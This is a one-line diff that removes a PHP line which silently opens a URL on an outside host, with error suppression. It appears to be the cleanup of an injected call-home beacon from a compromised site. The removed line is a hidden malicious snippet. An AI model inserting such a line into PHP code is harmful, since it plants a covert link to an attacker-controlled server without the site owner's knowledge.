@@ -1,1 +1,0 @@
-<?php @fclose(@fopen('http://u764648.s15.wh1.su/cron?auto', 'r'));
